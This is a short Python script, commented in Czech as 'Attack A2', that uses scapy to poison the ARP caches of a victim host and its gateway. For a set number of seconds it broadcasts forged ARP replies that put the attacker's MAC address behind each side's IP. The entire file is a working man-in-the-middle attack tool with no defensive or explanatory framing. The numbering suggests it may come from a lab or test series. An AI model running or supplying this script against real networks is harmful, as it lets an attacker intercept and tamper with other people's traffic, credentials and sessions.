"""Útok A2: otrávení ARP oběti i směrovače (MAC útočníka za IP druhé strany) po dobu argv[3] s."""
import sys, time
from scapy.all import ARP, Ether, get_if_hwaddr, sendp
victim, gw, dur = sys.argv[1], sys.argv[2], float(sys.argv[3])
me = get_if_hwaddr("eth0")
end = time.time() + dur
while time.time() < end:
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=gw, pdst=victim, hwsrc=me), iface="eth0", verbose=False)
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=victim, pdst=gw, hwsrc=me), iface="eth0", verbose=False)
    time.sleep(2)
